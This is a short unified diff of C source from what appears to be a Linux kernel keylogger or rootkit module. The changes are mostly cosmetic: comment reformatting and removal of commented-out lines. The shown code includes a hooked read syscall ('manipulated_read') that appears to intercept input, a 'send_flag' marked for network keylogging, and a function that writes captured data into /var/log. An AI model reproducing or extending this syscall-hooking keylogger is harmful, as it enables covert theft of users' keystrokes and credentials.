@@ -32,23 +32,16 @@ static loff_t foffset = 0;
 
 extern int send_flag; // For network keylogging
 
-/* Function used for local logging inside /var/log */
-void write_to_file(char *buf, long len)
+/*
+ * Function used for local logging inside /var/log
+ */
+void
+write_to_file(char *buf, long len)
 {
-	//mm_segment_t oldfs;
-	int ret;
-
 	if (!IS_ERR (fd)) {
-		//oldfs = get_fs();
-		//set_fs(get_ds());
-
-		ret = vfs_write(fd, buf, len, &foffset); 
+		vfs_write(fd, buf, len, &foffset); 
 		foffset += len;
-		//do_sync_write(fd, buffer, readed, 0);
-
-		//set_fs(oldfs);
-	}
-	
+	}	
 }
 
 /*
@@ -58,6 +51,7 @@ void write_to_file(char *buf, long len)
 asmlinkage long
 manipulated_read (unsigned int fd, char __user *buf, size_t count)
 {
+	/* increase our call counter */
 	INCREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
 	
 	int i;	
@@ -83,6 +77,7 @@ manipulated_read (unsigned int fd, char __user *buf, size_t count)
 		}
 	}
 
+	/* decrease our call counter and return */
 	DECREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
 	return ret;
 }
